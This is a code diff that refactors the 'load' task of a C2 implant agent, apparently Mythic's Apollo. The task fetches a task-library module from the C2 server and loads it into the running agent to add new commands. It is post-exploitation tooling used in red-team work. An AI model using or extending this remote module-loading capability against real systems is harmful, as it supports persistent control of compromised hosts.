@@ -35,60 +35,67 @@ namespace Tasks
 
         public override ST.Task CreateTasking()
         {
-            return new ST.Task(() =>
+            return new ST.Task(() => { Start(); }, _cancellationToken.Token);
+        }
+
+        public override void Start()
+        {
+            TaskResponse resp;
+            LoadParameters parameters = _jsonSerializer.Deserialize<LoadParameters>(_data.Parameters);
+            if (parameters.Commands.Length == 0)
             {
-                TaskResponse resp;
-                LoadParameters parameters = _jsonSerializer.Deserialize<LoadParameters>(_data.Parameters);
-                if (parameters.Commands.Length == 0)
-                {
-                    resp = CreateTaskResponse("No commands given to load.", true, "error");
-                } else if (string.IsNullOrEmpty(parameters.FileId))
-                {
-                    resp = CreateTaskResponse("No task library file given to retrieve.", true, "error");
-                } else
-                {
-                    if (_agent.GetFileManager().GetFile(
+                resp = CreateTaskResponse("No commands given to load.", true, "error");
+            }
+            else if (string.IsNullOrEmpty(parameters.FileId))
+            {
+                resp = CreateTaskResponse("No task library file given to retrieve.", true, "error");
+            }
+            else
+            {
+                if (_agent.GetFileManager().GetFile(
                         _cancellationToken.Token,
                         _data.ID,
                         parameters.FileId,
                         out byte[] taskLib))
+                {
+                    if (_agent.GetTaskManager().LoadTaskModule(taskLib, parameters.Commands))
                     {
-                        if (_agent.GetTaskManager().LoadTaskModule(taskLib, parameters.Commands))
+                        IMythicMessage[] items = new IMythicMessage[parameters.Commands.Length];
+                        for (int i = 0; i < items.Length; i++)
                         {
-                            IMythicMessage[] items = new IMythicMessage[parameters.Commands.Length];
-                            for(int i = 0; i < items.Length; i++)
+                            items[i] = new CommandInformation
                             {
-                                items[i] = new CommandInformation
-                                {
-                                    Action = "add",
-                                    Command = parameters.Commands[i]
-                                };
-                            }
-                            resp = CreateTaskResponse(
-                                $"Loaded {string.Join(", ", parameters.Commands)}",
-                                true,
-                                "completed",
-                                items);
-                            resp.ProcessResponse = new ProcessResponse()
-                            {
-                                Commands = parameters.Commands
+                                Action = "add",
+                                Command = parameters.Commands[i]
                             };
-                        } else
-                        {
-                            resp = CreateTaskResponse(
-                                $"One or more commands were not found in the task library.",
-                                true,
-                                "error");
                         }
-                    } else
+
+                        resp = CreateTaskResponse(
+                            $"Loaded {string.Join(", ", parameters.Commands)}",
+                            true,
+                            "completed",
+                            items);
+                        resp.ProcessResponse = new ProcessResponse()
+                        {
+                            Commands = parameters.Commands
+                        };
+                    }
+                    else
                     {
-                        resp = CreateTaskResponse("Failed to pull down task library.", true, "error");
+                        resp = CreateTaskResponse(
+                            $"One or more commands were not found in the task library.",
+                            true,
+                            "error");
                     }
                 }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
-        }
+                else
+                {
+                    resp = CreateTaskResponse("Failed to pull down task library.", true, "error");
+                }
+            }
 
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
+        }
     }
 }
 #endif
